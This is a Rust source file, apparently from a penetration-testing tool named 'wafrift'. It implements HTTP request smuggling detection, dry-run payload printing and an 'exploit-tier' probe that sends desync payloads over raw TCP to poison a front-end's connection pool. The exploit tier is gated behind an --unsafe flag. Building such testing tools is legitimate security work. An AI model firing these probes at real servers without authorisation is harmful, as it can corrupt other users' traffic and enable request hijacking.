    let addr = match resolve_host_once(&args.host, args.port).await {
        Ok(a) => a,
        Err(e) => {
            warn!(target: "wafrift::smuggle", host = %args.host, error = %e, "dns resolve failed");
            eprintln!("{} {e}", "error:".red());
            return ExitCode::from(1);
        }
    };
    let baseline_ms = match measure_baseline(
        addr,
        &args.host,
        args.baseline_samples,
        args.timeout_secs,
    )
    .await
    {
        Ok(b) => b,
        Err(e) => {
            warn!(target: "wafrift::smuggle", host = %args.host, error = %e, "baseline measurement failed");
            eprintln!("{} measure baseline: {e}", "error:".red());
            return ExitCode::from(1);
        }
    };

    let mut findings = Vec::new();
    for variant_key in ["detect-cl-te", "detect-te-cl"] {
        let info = match VARIANTS.iter().find(|v| v.key == variant_key) {
            Some(v) => v,
            None => {
                eprintln!(
                    "{} internal error: detection variant `{variant_key}` missing from catalogue",
                    "error:".red()
                );
                return ExitCode::from(2);
            }
        };
        let payload = match build_payload(info, &args.host, "") {
            Ok(p) => p,
            Err(e) => {
                eprintln!("{} build {variant_key}: {e}", "error:".red());
                return ExitCode::from(1);
            }
        };
        let elapsed = match time_first_byte(addr, &payload.raw_bytes, args.timeout_secs).await {
            Ok(t) => t,
            Err(e) => {
                eprintln!("{} fire {variant_key}: {e}", "error:".red());
                return ExitCode::from(1);
            }
        };
        let mut f = classify_detection(elapsed, baseline_ms, args.threshold_ms);
        f.variant = variant_key.to_string();
        // TRACING: per-probe classification result (the key decision point).
        // At debug level the operator sees why each probe was/wasn't flagged.
        if f.desync_inferred {
            info!(
                target: "wafrift::smuggle",
                variant = %variant_key,
                elapsed_ms = f.elapsed_ms,
                baseline_ms = f.baseline_ms,
                delta_ms = f.delta_ms,
                threshold_ms = f.threshold_ms,
                "DESYNC inferred: timing delta exceeds threshold"
            );
        } else {
            debug!(
                target: "wafrift::smuggle",
                variant = %variant_key,
                elapsed_ms = f.elapsed_ms,
                delta_ms = f.delta_ms,
                "probe clean: delta below threshold"
            );
        }
        findings.push(f);
    }

    if args.format == "json" {
        let out = serde_json::json!({
            "host": args.host,
            "port": args.port,
            "baseline_ms": baseline_ms,
            "threshold_ms": args.threshold_ms,
            "findings": findings,
        });
        println!("{}", serde_json::to_string_pretty(&out).unwrap_or_default());
        return ExitCode::SUCCESS;
    }

    println!("baseline median: {baseline_ms} ms");
    let mut any = false;
    for f in &findings {
        let tag = if f.desync_inferred {
            "🚨 DESYNC".red().bold()
        } else {
            "ok".green()
        };
        println!(
            "  {}: {} elapsed={}ms delta={:+}ms threshold={}ms",
            f.variant.bold(),
            tag,
            f.elapsed_ms,
            f.delta_ms,
            f.threshold_ms
        );
        any |= f.desync_inferred;
    }
    if any {
        println!(
            "\n{}: at least one probe took >= {} ms longer than baseline. \
             Investigate with `wafrift smuggle probe --variant <V> --unsafe` \
             on AUTHORISED targets.",
            "DESYNC INFERRED".red().bold(),
            args.threshold_ms
        );
    } else {
        println!(
            "\n{}: no timing differential >= {} ms. Host parses CL/TE \
             coherently OR rate-limits unusual chunked bodies (re-test \
             with --baseline-samples 7 --threshold-ms 800 if you want \
             tighter sensitivity).",
            "no desync inferred".green(),
            args.threshold_ms
        );
    }
    ExitCode::SUCCESS
}

fn run_list(format: &str) -> ExitCode {
    if format == "json" {
        let arr: Vec<_> = VARIANTS
            .iter()
            .map(|v| {
                serde_json::json!({
                    "key": v.key,
                    "long_name": v.long_name,
                    "tier": match v.tier {
                        SafetyTier::Detection => "detection",
                        SafetyTier::Exploit => "exploit",
                    },
                    "description": v.description,
                })
            })
            .collect();
        println!("{}", serde_json::to_string_pretty(&arr).unwrap_or_default());
        return ExitCode::SUCCESS;
    }
    println!(
        "{}",
        "── wafrift smuggle: variant catalogue ──".cyan().bold()
    );
    for v in VARIANTS {
        let tag = match v.tier {
            SafetyTier::Detection => "[detection]".green(),
            SafetyTier::Exploit => "[EXPLOIT]".red().bold(),
        };
        println!(
            "  {} {}: {}\n    {}",
            tag,
            v.key.bold(),
            v.long_name,
            v.description.bright_black()
        );
    }
    println!(
        "\n{} `--variant <key>` accepts the bracketed keys. \
         Exploit-tier variants require `--unsafe`.",
        "→".bright_blue()
    );
    ExitCode::SUCCESS
}

/// Replace standalone `\n` (lone LF, 0x0A) with the visible token `<LF>\n`
/// so that raw dry-run output makes the invisible control byte apparent.
/// Does NOT replace `\n` that is immediately preceded by `\r`: those are
/// legitimate CRLF line endings and should not be annotated.
///
/// This is a pure formatter used only in text/raw dry-run output; it never
/// affects the on-wire bytes.
fn annotate_lone_lf(s: &str) -> String {
    let bytes = s.as_bytes();
    let mut out = String::with_capacity(s.len() + 16);
    for (i, &b) in bytes.iter().enumerate() {
        if b == b'\n' && (i == 0 || bytes[i - 1] != b'\r') {
            out.push_str("<LF>\n");
        } else {
            out.push(b as char);
        }
    }
    out
}

fn run_dry(args: DryRunArgs) -> ExitCode {
    let prefix = unescape_prefix(&args.smuggled_prefix);
    let payload = match build_payload(args.variant.info, &args.host, &prefix) {
        Ok(p) => p,
        Err(e) => {
            eprintln!("{} build payload: {e}", "error:".red());
            return ExitCode::from(1);
        }
    };
    if args.format == "hex" {
        for chunk in payload.raw_bytes.chunks(16) {
            let hex: String = chunk
                .iter()
                .map(|b| format!("{b:02x}"))
                .collect::<Vec<_>>()
                .join(" ");
            let ascii: String = chunk
                .iter()
                .map(|&b| {
                    if (0x20..0x7f).contains(&b) {
                        b as char
                    } else {
                        '.'
                    }
                })
                .collect();
            println!("{hex:<48}  {ascii}");
        }
    } else {
        // Fix #8: for variants with lone-LF semantics the bare 0x0A byte is
        // invisible in a terminal, the cursor returns to column 0 without a
        // newline being printed.  Annotate standalone 0x0A (NOT 0x0D 0x0A) as
        // `<LF>` so the operator can see the byte that triggers the desync.
        // We key on the variant's key string rather than scanning the bytes so
        // the annotation is guaranteed to appear whenever the variant is
        // designed around a lone LF, regardless of where in the payload it
        // actually falls.
        let has_lone_lf_semantics =
            args.variant.info.key.contains("lone-lf") || args.variant.info.key.contains("lone_lf");

        match std::str::from_utf8(&payload.raw_bytes) {
            Ok(s) => {
                if has_lone_lf_semantics {
                    // Replace standalone \n (NOT \r\n) with visible <LF>\n.
                    // Walk char-by-char to avoid replacing the \n in \r\n.
                    let annotated = annotate_lone_lf(s);
                    print!("{annotated}");
                } else {
                    print!("{s}");
                }
            }
            Err(_) => {
                for b in &payload.raw_bytes {
                    print!("{}", *b as char);
                }
            }
        }
        if has_lone_lf_semantics {
            // Explicit note so the annotation purpose is unambiguous to an
            // operator who has never seen the <LF> convention before.
            println!(
                "\n# NOTE: byte 0x0A (lone LF, not CRLF) immediately precedes the smuggled prefix above."
            );
        }
    }
    // F79: meta line routing.
    // Pre-fix this was unconditionally eprintln! regardless of
    // --format. PowerShell treats any native-cmd stderr write as
    // NativeCommandError and surfaces it even when exit code is
    // 0; bash/zsh pipelines also can't grep the canary out of
    // stdout because it lives on stderr.
    //
    // For --format raw or --format hex, the meta belongs on
    // STDOUT (in a comment-style prefix so it doesn't corrupt
    // hex/raw parsing). For --format json (if ever added), we
    // skip the meta entirely, the JSON envelope carries the
    // canary already.
    let meta = format!(
        "── meta ── variant={} canary={} bytes={}",
        args.variant.info.key,
        payload.canary.token,
        payload.raw_bytes.len()
    );
    match args.format.as_str() {
        "hex" => {
            // hex output is line-oriented; meta as a leading
            // `#` comment doesn't break hexdump-style parsers.
            println!("# {meta}");
        }
        _ => {
            // raw / text: append meta as a trailing comment line
            // on stdout so curl-pasting + scripting both work.
            println!();
            println!("# {meta}");
        }
    }
    ExitCode::SUCCESS
}

async fn run_probe(args: ProbeSmuggleArgs) -> ExitCode {
    if args.variant.info.tier == SafetyTier::Exploit && !args.r#unsafe {
        warn!(
            target: "wafrift::smuggle",
            variant = %args.variant.info.key,
            host = %args.host,
            "exploit-tier probe refused: --unsafe not set"
        );
        eprintln!(
            "{} variant `{}` is EXPLOIT-tier, it WILL desync the \
             connection pool. Re-run with `--unsafe` to acknowledge \
             you have authorisation to test this target.",
            "refused:".red().bold(),
            args.variant.info.key
        );
        return ExitCode::from(1);
    }
    let prefix = unescape_prefix(&args.smuggled_prefix);
    let payload = match build_payload(args.variant.info, &args.host, &prefix) {
        Ok(p) => p,
        Err(e) => {
            warn!(target: "wafrift::smuggle", variant = %args.variant.info.key, error = %e, "payload build failed");
            eprintln!("{} build payload: {e}", "error:".red());
            return ExitCode::from(1);
        }
    };
    // TRACING: exploit probe about to fire, canary token lets operator
    // correlate the wire send with any canary echo they observe.
    // No sensitive value in the log: variant, host, byte count, and
    // canary (a random nonce, not a credential) are all public to the operator.
    info!(
        target: "wafrift::smuggle",
        variant = %args.variant.info.key,
        host = %args.host,
        port = args.port,
        payload_bytes = payload.raw_bytes.len(),
        canary = %payload.canary.token,
        "firing exploit-tier smuggle probe"
    );
    if args.format == "text" {
        eprintln!(
            "{} variant={} host={}:{} bytes={} canary={}",
            "── wafrift smuggle probe ──".cyan().bold(),
            args.variant.info.key.bold(),
            args.host.bold(),
            args.port,
            payload.raw_bytes.len(),
            payload.canary.token
        );
    }
    // Resolve once before connecting. Pass 20 R1 §1 SPEED, pre-fix the
    // exploit probe paid an extra DNS lookup that the detect path didn't.
    let addr = match resolve_host_once(&args.host, args.port).await {
        Ok(a) => a,
        Err(e) => {
            eprintln!("{} {e}", "error:".red());
            return ExitCode::from(1);
        }
    };
    let stream_fut = TcpStream::connect(addr);
    let mut stream = match timeout(Duration::from_secs(args.timeout_secs), stream_fut).await {
        Ok(Ok(s)) => s,
        Ok(Err(e)) => {
            eprintln!("{} tcp connect: {e}", "error:".red());
            return ExitCode::from(1);
        }
        Err(_) => {
            eprintln!("{} tcp connect: timeout", "error:".red());
            return ExitCode::from(1);
        }
    };
    if let Err(e) = stream.write_all(&payload.raw_bytes).await {
        eprintln!("{} tcp write: {e}", "error:".red());
        return ExitCode::from(1);
    }
    if let Err(e) = stream.flush().await {
        eprintln!("{} tcp flush: {e}", "error:".red());
        return ExitCode::from(1);
    }
    // Bounded read, hostile target could ship an unbounded
    // stream and OOM the scanner.
    // R50 pass-12 I4 (CLAUDE.md §7 DEDUPLICATION): reuse the
    // canonical cap from safe_body instead of redefining locally.
    const MAX_SMUGGLE_RESPONSE_BYTES: usize = crate::safe_body::DEFAULT_MAX_RESPONSE_BYTES;
    let mut buf = Vec::with_capacity(4096);
    let read_fut = async {
        let mut chunk = [0u8; 8192];
        loop {
            match stream.read(&mut chunk).await {
                Ok(0) => break,
                Ok(n) => {
                    if buf.len() + n > MAX_SMUGGLE_RESPONSE_BYTES {
                        // Hostile target (stop reading).
                        break;
                    }
                    buf.extend_from_slice(&chunk[..n]);
                }
                Err(_) => break,
            }
        }
        Ok::<(), std::io::Error>(())
    };
    let elapsed = Instant::now();
    let read_result = timeout(Duration::from_secs(args.timeout_secs), read_fut).await;
    let elapsed_ms = elapsed.elapsed().as_millis() as u64;
    let bytes_read = buf.len();
    let response_preview: String = String::from_utf8_lossy(&buf[..buf.len().min(512)]).into_owned();
    // Classify what the front-end did with the desync framing. The bytes
    // are already read; this is pure interpretation (status-line parse +
    // the timing/length outcome) so the operator gets a verdict, not just
    // a raw preview to eyeball.
    let parsed_status = crate::helpers::http_status_from_raw(&buf);
    let desync = classify_desync_outcome(parsed_status, bytes_read, read_result.is_err());
    // TRACING: response received, gives the operator latency and byte count
    // without requiring them to parse text output.
    debug!(
        target: "wafrift::smuggle",
        variant = %args.variant.info.key,
        elapsed_ms,
        bytes_read,
        timed_out = read_result.is_err(),
        "probe response received"
    );

    if args.format == "json" {
        let out = serde_json::json!({
            "host": args.host,
            "port": args.port,
            "variant": args.variant.info.key,
            "canary": payload.canary.token,
            "elapsed_ms": elapsed_ms,
            "bytes_read": bytes_read,
            "timed_out": read_result.is_err(),
            "status": parsed_status,
            "desync_signal": desync,
            "response_preview": response_preview,
        });
        println!("{}", serde_json::to_string_pretty(&out).unwrap_or_default());
        return ExitCode::SUCCESS;
    }

    println!(
        "  read {} bytes in {} ms{}",
        bytes_read,
        elapsed_ms,
        if read_result.is_err() {
            " (timed out)"
        } else {
            ""
        }
    );
    if bytes_read > 0 {
        println!("  ── response preview ──");
        for line in response_preview.lines().take(10) {
            println!("  | {line}");
        }
    }
    println!(
        "\n{}: the connection pool on the front-end is now potentially \
         poisoned. The smuggled prefix will surface on the NEXT request \
         that lands on this back-end socket. Replay with `nc` or `curl` \
         to observe the smuggled response. Note: canary `{}` is wafrift's \
         correlation ID for THIS probe in the output above, it is NOT \
         auto-embedded in your prefix, so put a unique marker (e.g. this \
         token) inside `--smuggled-prefix` and grep the replayed response \
         for it to confirm the smuggle landed.",
        "next step".yellow().bold(),
        payload.canary.token
    );
    let status_note = parsed_status.map_or_else(
        || "no parseable status".to_string(),
        |s| format!("status {s}"),
    );
    println!(
        "\n{} {} ({}): {}",
        "desync signal:".yellow().bold(),
        desync.as_str().bold(),
        status_note,
        desync.guidance(),
    );
    ExitCode::SUCCESS
}

#[allow(clippy::needless_pass_by_value)]
pub(crate) fn run_smuggle(args: SmuggleArgs) -> ExitCode {
    match args.action {
        SmuggleAction::List(a) => run_list(&a.format),
        SmuggleAction::DryRun(a) => run_dry(a),
        SmuggleAction::Detect(a) => {
            let rt = match tokio::runtime::Builder::new_current_thread()
                .enable_all()
                .build()
            {
                Ok(rt) => rt,
                Err(e) => {
                    eprintln!("{} tokio runtime: {e}", "error:".red());
                    return ExitCode::from(1);
                }
            };
            rt.block_on(run_detect(a))
        }
        SmuggleAction::Probe(a) => {
            let rt = match tokio::runtime::Builder::new_current_thread()
                .enable_all()
                .build()
            {
                Ok(rt) => rt,
                Err(e) => {
                    eprintln!("{} tokio runtime: {e}", "error:".red());
                    return ExitCode::from(1);
                }
            };
            rt.block_on(run_probe(a))
        }
    }
}

#[cfg(test)]
#[path = "smuggle_cmd_tests.rs"]
mod tests;
